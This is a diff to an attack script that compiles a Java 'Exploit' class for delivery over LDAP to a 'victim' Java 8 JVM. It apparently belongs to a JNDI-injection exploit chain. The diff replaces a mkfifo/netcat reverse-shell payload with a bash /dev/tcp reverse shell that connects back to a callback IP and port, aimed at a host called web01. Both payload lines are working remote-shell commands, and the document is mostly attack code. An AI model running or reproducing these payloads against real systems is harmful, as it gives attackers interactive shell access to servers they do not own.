@@ -9,7 +9,7 @@ LDAP_PORT=1389
 
 # Generate and compile Exploit.java with callback IP/port baked in.
 # Compile with --release 8 so the class loads on the Java 8 victim JVM.
-# Payload uses mkfifo + busybox nc — works on Alpine (no bash, no /dev/tcp).
+# web01 is Ubuntu 22.04 — bash + /dev/tcp available.
 echo "[*] Compiling Exploit.class (callback: ${CALLBACK_IP}:${CALLBACK_PORT})..."
 cd /opt/payloads
 
@@ -18,8 +18,8 @@ public class Exploit {
     static {
         try {
             Runtime.getRuntime().exec(new String[]{
-                "/bin/sh", "-c",
-                "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${CALLBACK_IP} ${CALLBACK_PORT} >/tmp/f"
+                "/bin/bash", "-c",
+                "bash -i >& /dev/tcp/${CALLBACK_IP}/${CALLBACK_PORT} 0>&1"
             });
         } catch (Exception e) { e.printStackTrace(); }
     }
